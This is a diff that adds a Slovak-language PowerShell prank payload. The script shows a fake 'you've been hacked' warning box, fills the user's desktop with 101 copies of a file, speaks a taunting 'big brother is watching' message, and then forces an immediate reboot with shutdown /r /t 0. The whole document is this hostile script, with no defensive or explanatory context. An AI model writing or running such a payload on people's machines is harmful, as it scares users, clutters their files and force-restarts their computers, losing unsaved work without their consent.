@@ -1,0 +1,10 @@
+Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('BOL SI HACKNUTY!! ENJOY :-)','Parazit','Ok','Warning')
+
+cd $env:userprofile\Desktop; echo "si hacknuty" > subor.txt; ( 0 .. 100 ) | % { Copy-Item .\subor.txt .\subor$_.txt }
+
+cat subor.txt
+
+Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak(“Hello my friend, you are being watch by the big brother, hahaha”)
+
+shutdown /r /t 0
+
